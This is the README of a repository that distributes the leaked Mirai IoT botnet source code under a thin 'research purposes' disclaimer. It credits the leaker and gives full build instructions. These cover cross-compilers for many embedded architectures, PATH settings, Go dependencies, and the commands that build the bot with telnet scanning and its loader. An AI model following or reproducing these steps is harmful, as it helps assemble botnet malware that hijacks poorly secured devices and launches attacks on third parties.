# Mirai BotNet
Leaked Linux.Mirai Source Code for Research/IoT Development Purposes

Uploaded for research purposes and so we can develop IoT and such.

See "ForumPost.txt" or [ForumPost.md](ForumPost.md) for the post in which it
leaks, if you want to know how it is all set up and the likes.

## Requirements
* gcc
* golang
* electric-fence
* mysql-server
* mysql-client

## Credits
[Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)

## Disclaimer
This repository is for academic purposes, the use of this software is your
responsibility.

## Warning
The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution.

#Build Mirai
REF: https://www.cdxy.me/?p=746
Modifications to sources are included in this repo, so we are going to skip them
´´´
#Set MySQL password to 'root' (if different, change the code in mirai/cnc/main.go)
apt-get install git gcc golang electric-fence mysql-server mysql-client

cd Mirai-BC
mkdir cross-compile-bin
cd cross-compile-bin
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
cd ../scripts
sudo ./cross-compile.sh
#Type n at "Install mysql-server and mysql-client (y/n)?"
´´´

edit .bashrc and add following string at bottom
´´´
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export GOPATH=$HOME/go
´´´
mkdir ~/go
source ~/.bashrc

#GO
If getting errors, upgrade Go (https://askubuntu.com/questions/720260/updating-golang-on-ubuntu/755392#755392)

go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

#Build
cd ../mirai
./build.sh debug telnet

#Build Loader
cd ../loader
./build.sh
